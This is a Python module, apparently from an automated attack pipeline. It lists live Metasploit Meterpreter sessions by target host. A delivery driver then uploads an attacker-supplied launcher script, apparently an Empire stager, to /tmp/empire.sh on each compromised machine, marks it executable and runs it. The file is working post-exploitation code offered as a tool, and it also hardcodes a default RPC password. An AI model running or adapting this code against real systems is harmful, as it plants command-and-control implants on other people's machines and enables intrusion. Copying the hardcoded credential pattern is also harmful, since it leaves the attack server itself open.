from modules.core.driver import BaseToolDriver, DriverResult, ParsedResult
from modules.core.utils import safe_filename
from pymetasploit3.msfrpc import MsfRpcClient
import os
from pymetasploit3.msfrpc import MsfRpcClient

def update_metasploit_sessions(config, logger=None):
    msfrpc_pass = config.get("msfrpc_password", "workplease")
    msfrpc_host = config.get("msfrpc_host", "127.0.0.1")
    msfrpc_port = config.get("msfrpc_port", 55553)
    client = MsfRpcClient(msfrpc_pass, server=msfrpc_host, port=msfrpc_port)

    session_map = {}
    for sid, session in client.sessions.list.items():
        # Extract target IP or hostname from session info (host, etc)
        target = session.get("target_host") or session.get("session_host") or session.get("tunnel_peer")
        if target:
            # Remove port from tunnel_peer if present
            if ":" in target:
                target = target.split(":")[0]
            session_map.setdefault(target, []).append(sid)
    config["metasploit_sessions"] = session_map
    if logger:
        logger.info(f"[Pipeline] Updated Meterpreter sessions: {session_map}")

class DeliveryDriver(BaseToolDriver):
    name = "delivery"

    def run(self, target: str, **kwargs) -> DriverResult:
        launcher = kwargs.get("launcher")
        if not launcher:
            raise RuntimeError("No launcher code provided to DeliveryDriver!")

        sessions = self.config.get("metasploit_sessions", {}).get(target, [])
        if not sessions:
            raise RuntimeError(f"No Meterpreter session for {target}")

        sid = sessions[0]
        stager_path = os.path.join(
            self.config["empire_output_dir"],
            f"{safe_filename(target)}.sh"
        )

        # 1. Write the launcher code to stager_path
        with open(stager_path, "w") as f:
            f.write(launcher)

        # Configurable RPC credentials
        msfrpc_pass = self.config.get("msfrpc_password", "workplease")
        msfrpc_host = self.config.get("msfrpc_host", "127.0.0.1")
        msfrpc_port = self.config.get("msfrpc_port", 55553)

        client = MsfRpcClient(msfrpc_pass, server=msfrpc_host, port=msfrpc_port)
        session = client.sessions.session(sid)

        # 2. Upload the file using Meterpreter's API
        with open(stager_path, "rb") as f:
            stager_data = f.read()
        upload_result = session.upload_file("/tmp/empire.sh", stager_data)
        if not upload_result:
            raise RuntimeError("Upload failed")

        # 3. Make executable and execute
        session.run_with_output("chmod +x /tmp/empire.sh")
        session.run_with_output("/tmp/empire.sh")

        return DriverResult(raw_output=stager_path)

    def parse(self, raw_output_path: str) -> ParsedResult:
        return ParsedResult(data={"deployed": True})
